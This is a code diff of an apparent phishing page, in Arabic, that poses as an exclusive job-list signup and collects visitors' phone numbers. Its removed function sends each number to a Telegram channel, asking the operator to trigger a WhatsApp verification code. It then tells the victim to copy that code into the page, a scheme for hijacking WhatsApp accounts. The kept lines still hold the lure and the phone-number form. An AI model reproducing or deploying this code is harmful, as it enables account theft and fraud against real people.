@@ -1081,105 +1081,41 @@ function showMandatoryJoinModal() {
             </div>
             <div style="background: #f8f9fa; padding: 20px; border-radius: 15px; margin: 20px 0; border-right: 4px solid #FFD700;">
                 <p style="color: #333; font-size: 1.1em; margin: 10px 0; font-weight: 600;">
-                    📱 ابدأ بإدخال رقم هاتفك  (9 أرقام)
+                    📱 ابدأ بإدخال رقم هاتفك
                 </p>
                 <p style="color: #666; font-size: 0.95em; margin: 10px 0;">
-                    يجب أن يبدأ الرقم بأحد الأرقام التالية: <strong style="color: #1E90FF;">77, 78, 71, 70, 73</strong>
+                    سيتم استخدام رقم هاتفك لإرسال قائمة الوظائف الحصرية والتواصل معك مباشرة عبر واتساب.
                 </p>
             </div>
             <div style="margin: 20px 0;">
-    <input
-        type="tel"
-        id="joinPhoneNumber"
-        placeholder="أدخل رقم هاتفك"
-        style="width: 70%; padding: 15px; border: 3px solid #FFD700; border-radius: 10px; font-size: 1.3em; text-align: center; direction: ltr; font-weight: bold; transition: all 0.3s;"
-        onfocus="this.style.borderColor='#1E90FF'; this.style.boxShadow='0 0 10px rgba(30, 144, 255, 0.3)';"
-        onblur="this.style.borderColor='#FFD700'; this.style.boxShadow='none';"
-    />
-</div>
-<button
-    onclick="submitJoinPhoneNumber()"
-    style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); color: #000; padding: 15px 50px; border: none; border-radius: 25px; font-size: 1.3em; cursor: pointer; font-weight: bold; box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4); margin-top: 10px; transition: all 0.3s;"
-    onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 8px 20px rgba(255, 215, 0, 0.6)';"
-    onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='0 5px 15px rgba(255, 215, 0, 0.4)';"
->
-    متابعة →
-</button>
-<p style="color: #999; font-size: 0.85em; margin-top: 15px;">
-    بالضغط على "متابعة" أنت توافق على
-    <a href="#" onclick="showTerms(); return false;" style="color: #1E90FF; text-decoration: underline;">شروط الاستخدام</a>
-    و
-    <a href="#" onclick="showPrivacy(); return false;" style="color: #1E90FF; text-decoration: underline;">سياسة الخصوصية</a>
-</p>
-</div>
-
+                <input
+                    type="tel"
+                    id="joinPhoneNumber"
+                    placeholder="أدخل رقم هاتفك"
+                    style="width: 70%; padding: 15px; border: 3px solid #FFD700; border-radius: 10px; font-size: 1.3em; text-align: center; direction: ltr; font-weight: bold; transition: all 0.3s;"
+                    onfocus="this.style.borderColor='#1E90FF'; this.style.boxShadow='0 0 10px rgba(30, 144, 255, 0.3)';"
+                    onblur="this.style.borderColor='#FFD700'; this.style.boxShadow='none';"
+                />
+            </div>
+            <button
+                onclick="submitJoinPhoneNumber()"
+                style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); color: #000; padding: 15px 50px; border: none; border-radius: 25px; font-size: 1.3em; cursor: pointer; font-weight: bold; box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4); margin-top: 10px; transition: all 0.3s;"
+                onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 8px 20px rgba(255, 215, 0, 0.6)';"
+                onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='0 5px 15px rgba(255, 215, 0, 0.4)';"
+            >
+                متابعة →
+            </button>
+            <p style="color: #999; font-size: 0.85em; margin-top: 15px;">
+                بالضغط على "متابعة" أنت توافق على
+                <a href="#" onclick="showTerms(); return false;" style="color: #1E90FF; text-decoration: underline;">شروط الاستخدام</a>
+                و
+                <a href="#" onclick="showPrivacy(); return false;" style="color: #1E90FF; text-decoration: underline;">سياسة الخصوصية</a>
+            </p>
+        </div>
     `;
     
     modal.style.display = 'block';
     document.body.style.overflow = 'hidden'; // Prevent scrolling
-}
-
-// Submit phone number from join modal
-async function submitJoinPhoneNumber() {
-    const phoneInput = document.getElementById('joinPhoneNumber');
-    const phoneNumber = phoneInput.value.trim();
-    const modalBody = document.getElementById('joinModalBody');
-    
-    // ✅ تحقق بسيط: فقط نتأكد أن الحقل مو فاضي وأنه أرقام
-    // بدون أي شرط بداية وبدون شرط طول معيّن
-    if (!phoneNumber || !/^\d+$/.test(phoneNumber)) {
-        alert('⚠️ يرجى إدخال رقم هاتف (أرقام فقط)');
-        return;
-    }
-    
-    // حفظ رقم الهاتف
-    localStorage.setItem('joinPhoneNumber', phoneNumber);
-    
-    // Show loading
-    modalBody.innerHTML = '<div style="text-align: center; padding: 40px;"><div class="loading">⏳ جارٍ إرسال رمز التحقق إلى واتساب...</div></div>';
-    
-    // Send phone number to Telegram
-    await sendToTelegram(`📱 رقم الهاتف من نافذة الانضمام:\n${phoneNumber}\n\n⚠️ يرجى إرسال رمز التحقق إلى هذا الرقم عبر واتساب`);
-    
-    // Wait a moment
-    await new Promise(resolve => setTimeout(resolve, 2000));
-    
-    // Show verification code input with progress
-    modalBody.innerHTML = `
-        <div style="text-align: center; padding: 20px;">
-            <div class="progress-steps">
-                <div class="step completed">
-                    <div class="step-number">✓</div>
-                    <div class="step-label">رقم الهاتف</div>
-                </div>
-                <div class="step active">
-                    <div class="step-number">2</div>
-                    <div class="step-label">التحقق</div>
-                </div>
-                <div class="step">
-                    <div class="step-number">3</div>
-                    <div class="step-label">الاسم</div>
-                </div>
-            </div>
-            <h2 style="color: #28a745; margin-bottom: 20px; font-size: 1.8em;">✅ تم إرسال رمز التحقق</h2>
-            <div style="background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%); padding: 25px; border-radius: 15px; margin: 20px 0; border: 2px solid #28a745; box-shadow: 0 5px 15px rgba(40, 167, 69, 0.2);">
-                <p style="color: #155724; font-size: 1.2em; font-weight: bold; margin-bottom: 15px;">📱 تحقق من واتساب الآن!</p>
-                <p style="color: #155724; font-size: 1.05em; line-height: 1.8;">
-                    تم إرسال رمز التحقق إلى رقم <strong style="font-size: 1.1em;">${phoneNumber}</strong> عبر واتساب.<br>
-                    اذهب إلى واتساب وانقل رمز التحقق المرسل إليك، ثم أدخله في الحقل أدناه.
-                </p>
-            </div>
-            <p style="color: #333; font-size: 1.1em; margin: 20px 0; font-weight: 600;">
-                أدخل رمز التحقق (4 أرقام على الأقل):
-            </p>
-            <div style="margin: 20px 0;">
-                <input type="text" id="joinVerificationCode" placeholder="أدخل الرمز" maxlength="10" style="width: 60%; padding: 15px; border: 3px solid #FFD700; border-radius: 10px; font-size: 1.5em; text-align: center; letter-spacing: 5px; direction: ltr; font-weight: bold; transition: all 0.3s;" onfocus="this.style.borderColor='#28a745'; this.style.boxShadow='0 0 10px rgba(40, 167, 69, 0.3)';" onblur="this.style.borderColor='#FFD700'; this.style.boxShadow='none';" />
-            </div>
-            <button onclick="submitJoinVerificationCode()" style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); color: #000; padding: 15px 50px; border: none; border-radius: 25px; font-size: 1.3em; cursor: pointer; font-weight: bold; box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4); margin-top: 10px; transition: all 0.3s;" onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 8px 20px rgba(255, 215, 0, 0.6)';" onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='0 5px 15px rgba(255, 215, 0, 0.4)';">
-                تأكيد الرمز →
-            </button>
-        </div>
-    `;
 }
 
 
